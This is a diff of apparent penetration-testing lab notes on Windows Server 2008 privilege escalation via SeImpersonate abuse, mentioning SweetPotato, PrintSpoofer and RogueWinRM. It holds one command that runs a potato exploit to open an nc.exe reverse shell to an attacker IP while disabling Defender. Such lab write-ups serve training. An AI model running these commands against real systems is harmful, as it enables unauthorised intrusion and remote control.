@@ -152,20 +152,18 @@ Double checking for the wpad entry
 As per ACTUALLY READING THE INSTRUCTIONS
 ![](window2008server.png)
 
-
+This failed for some reason that lead me to try both versions of PrintSpoofer.exe
 ```
 .\potato.exe -ip 127.0.0.1 -cmd "c:\wamp\www\nc.exe 192.168.45.225 6969 -e c:\windows\system32\cmd.exe" -disable_exhaust true -disable_defender true --spoof_host WPAD.EMC.LOCAL
 ```
 
-Built my own versions of both x86 and x64 SweetPotato considering [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) for both [SweetPotato](https://github.com/CCob/SweetPotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
-
-x64 and x86 version return the same error
+Built my own versions of both x86 and x64 SweetPotato considering [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) for both [SweetPotato](https://github.com/CCob/SweetPotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). x64 and x86 version return the same error
 ![](neitherx8664-sameerror.png)
 
 But it is not actually running...
 ![](itran.png)
 
-Ran wes.py and there are lots of Privilege Escalations to fall back on if required. I am just concern that seImpersonate Privilege is just glaring in the face. 
+Ran wes.py and there are lots of Privilege Escalations to fall back on if required. I am just concern that seImpersonate Privilege is just glaring in the face. Due to the only documentation on any of the github repositories directly mentioning Windows Server 2008. I decided to retry the original. 
 
 Try https://github.com/antonioCoco/RogueWinRM
 ## Exploit
